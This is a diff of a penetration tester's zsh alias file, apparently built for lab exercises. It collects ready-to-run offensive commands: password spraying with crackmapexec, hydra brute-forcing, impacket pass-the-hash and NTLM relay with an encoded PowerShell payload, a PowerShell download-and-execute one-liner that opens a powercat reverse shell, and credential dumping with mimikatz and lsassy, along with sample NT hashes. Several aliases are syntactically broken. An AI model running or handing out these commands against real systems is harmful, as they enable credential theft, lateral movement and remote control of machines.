@@ -1,45 +1,70 @@
-# alias example='(){ echo Your arg was $1. ;}
-alias magic='source /home/kali/.zshrc_alias'
+#$DOMAIN = hackn.lab or medtech.com
+#$DC = server01.hackn.lab or dc01.medtech.com
+# alias example='(){ echo Your arg was $1. ;}'
+alias magic='source /home/kali/.kali'
+alias setip="/home/kali/setip.py && source /home/kali/.kali"
+export ip="34324"
+alias s='(){grep -i "$1" /home/kali/.kali --color}'
+alias setcwd='hash -d cwd=`pwd`'
+alias printcwd='echo ~cwd'
 alias shells='(){ shells.sh $1 ;}'
-alias setcwd='(){export cwd="$1"}'
-alias cwd='(){cd $cwd}'
-alias printcwd'(){echo $cwd}'
+
 #### SMB ####
 #enum4linux -a $ip
-alias auto_crackmap='echo "crackmapexec smb 192.168.200.75 -u usernames.txt -p 'Nexus123!' -d corp.com --continue-on-success";echo "or --shares"'
+alias auto_crackmapexec='echo "crackmapexec smb 192.168.200.75 -u usernames.txt -p 'Nexus123!' -d corp.com --continue-on-success";echo "or --shares"'
+
 #### DNS ####
-alias auto_dnsrecon="dnsrecon -d $ip /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.md"
-#dnsrecon list = dnsrecon -d megacorpone.com -t axfr
+alias auto_dnsrecon='dnsrecon -d $ip /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.md'
+alias dnsrecon_list='dnsrecon -d megacorpone.com -t axfr'
+
 #### LDAP ###
 alias auto_ldap='(){ldapsearch -h "$1" -p "$2" -x -s base}'
+
 #### Transfer Files #####
-alias iwr='(){echo "iwr -uri http://$ip:8000/$1 -Outfile $1"'
+alias pyserv='python3 -m http.server'
+alias iwr='(){echo "iwr -uri http://"$ip":8000/"$1" -Outfile "$1""'
 alias startWebDav='(){wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/}'
+
 #### Hydra #####
-alias hydra_unk '(){hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt -vV $ip "$1"}'
-alias hydra_gethttp '(){hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-get "$1"' # $1 = /webpage/
-alias hydra_httppostform='(){echo "hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"}'
+alias hydra_unk='(){hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/rockyou.txt -vV "$ip" "$1"}'
+alias hydra_gethttp='(){hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-get "$1"' # $1 = /webpage/
+alias hydra_httppostform='(){echo "hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"}'
 
 #### Impacket ####
-#alias impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
-#alias impacket-wmiexec -hashes 00000000000000000000000000000000: 2a944a58d4ffa77137b2c587e6ed7626 maria@192.168.210.70
-#alias impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG5...." #dir \\192.168.119.2\test -> on tgt machine
-#alias impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+alias imp-psexec='impacket-psexec -hashes 00000000000000000000000000000000:"$1" "$username"@"$ip"' # $1 = NT Hash
+alias imp-wmiexec='impacket-wmiexec -hashes 00000000000000000000000000000000:"$1" "$username"@"$ip"' # $1 = NT Hash
+alias imp-ntlmrelayx='impacket-ntlmrelayx --no-http-server -smb2support -t "$ip" -c "powershell -enc JABjAGwAaQBlAG5...."' #dir \\192.168.119.2\test -> on tgt machine to catch hash
+alias impacket-mssqlclient "$username":"$1"@"$ip" -windows-auth # $1 = share name
 #alias mysql= -u root -p 'root' -h 192.168.50.16 -P 3306
 #alias powershell_oneliner='(){powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$ip:8000/powercat.ps1');
 powercat -c 192.168.45.245 -p 4444 -e powershell"
 #### Ligolo-ng ####
-alias start_ligolo '(){sudo ip tuntap add user `hostname` mode tun ligolo;sudo ip link set ligolo up;./proxy -self-cert}'
-alias echo_ligolo_client '(){echo "./agent -connect $lhost:11601";echo "sudo ip route add __IP__ dev ligolo"}'
-alias ligolo_listeners '(){echo "listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:4444 --tcp";echo "listener_add --addr 0.0.0.0:9000 --to 127.0.0.1:4444 --tcp"}'
-alias ligolo_magicip 'echo "Local Ligolo Agent IP = 240.0.0.1"'
+alias ligolo_start='(){sudo ip tuntap add user `hostname` mode tun ligolo;sudo ip link set ligolo up;./proxy -self-cert}'
+alias ligolo_client_echo='(){echo "./agent -connect $LHOST:11601";echo "sudo ip route add _IP_ dev ligolo"}'
+alias ligolo_listeners_echo='(){echo "listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:4444 --tcp";echo "listener_add --addr 0.0.0.0:9000 --to 127.0.0.1:4444 --tcp"}'
+alias ligolo_magicip='echo "Local Ligolo Agent IP = 240.0.0.1"'
 #### Mimikatz ####
-alias print_mimikatz = 'echo ".\mimikatz.exe";echo "privilege::debug";echo "sekurlsa::logonpasswords"; echo "token::elevate"; echo "lsadump::sam";'
+alias mimikatz_print='echo ".\mimikatz.exe \n privilege::debug \n sekurlsa::logonpasswords \n token::elevate \n lsadump::sam"'
 #### Get Usernames ####
-alias get_kerb_users_nmap="(){nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=''}"
+alias get_kerb_users_nmap="(){nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=''}" # realm=medtech.com
 #kerbrute= kerbrute bruteuser -d test.local passwords.txt john
+
 #### lsassy ####
-#https://github.com/tristanp299/Attack_Chain/blob/main/lsassy.md
+#lsassy -d hackn.lab -u pixis -p P4ssw0rd 192.168.1.0/24
+alias lsassy_users='lsassy -d $domain -u $username -H $HASH $RHOST --users'
+alias lsassy_pl_creds='lsassy -d hackn.lab -u $username -p $password $RHOSTS'
+alias lsassy_procdump='lsassy -d hackn.lab -u $username -p $password dc01.hackn.lab -m procdump -O procdump_path=/opt/Sysinternals/procdump.exe'
+alias lsassy_dumpert -d hackn.lab -u $username -p $password dc01.hackn.lab -m dumpert -O dumpert_path=/opt/dumpert.exe
+alias lsassy_dumpertdll='lsassy -d hackn.lab -u $username -p $password dc01.hackn.lab -m dumpertdll -O dumpertdll_path=/opt/dumpert.dll
+# Kerberos tickets harvesting
+alias lsassy_tickets='lsassy -d hackn.lab -u pixis -p P4ssw0rd dc01.hackn.lab -K "/tmp/kerberos_tickets"'
+# Cleartext credentials
+alias lsassy_local_creds_txt='lsassy -u $username -p $password server01.hackn.lab' ## Local user
+alias lsassy_domain_creds_txt='lsassy -d hackn.lab -u $username -p $password server01.hackn.lab' ## Domain user
+#Pass-the-Hash
+alias lsassy_pth='lsassy -d hackn.lab -u jsnow -H aad3b435b51404eeaad3b435b51404ee:38046f6aa4f7283f9a6b7e1575452109 server01.hackn.lab'
+# LM:NT OR # lsassy -d hackn.lab -u jsnow -H 38046f6aa4f7283f9a6b7e1575452109 server01.hackn.lab
+aad3b435b51404eeaad3b435b51404ee
 #### Get Hashes ####
 alias getnpusers='(){python3 GetNPUsers.py test.local/ -dc-ip "$1" -usersfile usernames.txt -format hashcat -outputfile getnpusers_hashes.txt}`
 #### Found Hash #######
